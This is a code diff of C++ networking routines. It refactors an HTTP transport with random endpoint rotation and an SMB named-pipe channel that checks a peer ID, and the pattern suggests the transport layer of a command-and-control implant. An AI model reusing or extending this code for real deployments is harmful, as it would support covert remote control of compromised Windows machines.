@@ -64,7 +64,7 @@ namespace Network {
 
             *stream = (_stream*) Malloc(sizeof(_stream));
             (*stream)->buffer     = B_PTR(response);
-            (*stream)->msg_length = total;
+            (*stream)->length = total;
 
         defer:
             if (!success) {
@@ -116,14 +116,15 @@ namespace Network {
             }
 
             if (!(req_ctx->conn_handle = ctx->win32.WinHttpConnect(handle, address, port, 0))) {
-                ctx->nt.NtClose(handle);
+                ctx->win32.NtClose(handle);
                 return false;
             }
 
+            auto n_endpoints = ctx->transport.http->n_endpoints;
+            req_ctx->endpoint = ctx->transport.http->endpoints[RANDOM(n_endpoints)];
+
             auto endpoint   = req_ctx->endpoint;
             auto flags      = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
-
-            RANDOM_SELECT(endpoint, ctx->transport.http->endpoints);
 
             if (ctx->transport.b_ssl) {
                 flags |= WINHTTP_FLAG_SECURE;
@@ -255,7 +256,7 @@ namespace Network {
                 }
             }
 
-            x_assertb(ctx->win32.WinHttpSendRequest(handle, nullptr, 0, out->buffer, out->msg_length, out->msg_length, 0));
+            x_assertb(ctx->win32.WinHttpSendRequest(handle, nullptr, 0, out->buffer, out->length, out->length, 0));
             x_assertb(ctx->win32.WinHttpReceiveResponse(handle, nullptr));
             x_assertb(ctx->win32.WinHttpQueryHeaders(handle, query, nullptr, &status, &n_status, nullptr));
 
@@ -347,7 +348,7 @@ namespace Network {
             uint32_t total  = 0;
 
             do {
-                const auto length = __min((in->msg_length - total), PIPE_BUFFER_MAX);
+                const auto length = __min((in->length - total), PIPE_BUFFER_MAX);
 
                 if (!ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, (DWORD*) &read, nullptr)) {
                     if (ntstatus == ERROR_NO_DATA) {
@@ -357,7 +358,7 @@ namespace Network {
 
                 total += read;
             }
-            while (total < in->msg_length);
+            while (total < in->length);
             return true;
         }
 
@@ -368,7 +369,7 @@ namespace Network {
             uint32_t write = 0;
 
             do {
-                const auto length = __min((out->msg_length - total), PIPE_BUFFER_MAX);
+                const auto length = __min((out->length - total), PIPE_BUFFER_MAX);
 
                 if (!ctx->win32.WriteFile(handle, B_PTR(out->buffer) + total, length, (DWORD*) &write, nullptr)) {
                     return false;
@@ -376,7 +377,7 @@ namespace Network {
 
                 total += write;
             }
-            while (total < out->msg_length);
+            while (total < out->length);
             return true;
         }
 
@@ -386,26 +387,26 @@ namespace Network {
             SMB_PIPE_SEC_ATTR smb_sec_attr  = { };
             SECURITY_ATTRIBUTES sec_attr    = { };
 
-            if (!ctx->transport.pipe_handle) {
+            if (!ctx->transport.egress_handle) {
                 if (
                     !SmbContextInit(&smb_sec_attr, &sec_attr) ||
-                    !(ctx->transport.pipe_handle = ctx->win32.CreateNamedPipeW(ctx->transport.pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
+                    !(ctx->transport.egress_handle = ctx->win32.CreateNamedPipeW(ctx->transport.egress_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                     return false;
                 }
 
                 SmbContextDestroy(&smb_sec_attr);
 
-                if (!ctx->win32.ConnectNamedPipe(ctx->transport.pipe_handle, nullptr)) {
-                    ctx->nt.NtClose(ctx->transport.pipe_handle);
+                if (!ctx->win32.ConnectNamedPipe(ctx->transport.egress_handle, nullptr)) {
+                    ctx->win32.NtClose(ctx->transport.egress_handle);
                     return false;
                 }
             }
 
-            if (!PipeWrite(ctx->transport.pipe_handle, out)) {
+            if (!PipeWrite(ctx->transport.egress_handle, out)) {
                 if (ntstatus == ERROR_NO_DATA) {
 
-                    if (ctx->transport.pipe_handle) {
-                        ctx->nt.NtClose(ctx->transport.pipe_handle);
+                    if (ctx->transport.egress_handle) {
+                        ctx->win32.NtClose(ctx->transport.egress_handle);
                     }
                     return false;
                 }
@@ -422,22 +423,22 @@ namespace Network {
             DWORD total = 0;
             *in = CreateStream();
 
-            if (ctx->win32.PeekNamedPipe(ctx->transport.pipe_handle, nullptr, 0, nullptr, &total, nullptr)) {
+            if (ctx->win32.PeekNamedPipe(ctx->transport.egress_handle, nullptr, 0, nullptr, &total, nullptr)) {
                 if (total > sizeof(uint32_t) * 2) {
 
-                    if (!ctx->win32.ReadFile(ctx->transport.pipe_handle, &peer_id, sizeof(uint32_t), &total, nullptr)) {
+                    if (!ctx->win32.ReadFile(ctx->transport.egress_handle, &peer_id, sizeof(uint32_t), &total, nullptr)) {
                         return false;
                     }
                     if (ctx->session.peer_id != peer_id) {
                         return false;
                     }
-                    if (!ctx->win32.ReadFile(ctx->transport.pipe_handle, &msg_size, sizeof(uint32_t), &total, nullptr)) {
+                    if (!ctx->win32.ReadFile(ctx->transport.egress_handle, &msg_size, sizeof(uint32_t), &total, nullptr)) {
                         if (ntstatus != ERROR_MORE_DATA) {
                             return false;
                         }
                     }
 
-                    if (!PipeRead(ctx->transport.pipe_handle, *in)) {
+                    if (!PipeRead(ctx->transport.egress_handle, *in)) {
                         if (*in) {
                             DestroyStream(*in);
                         }
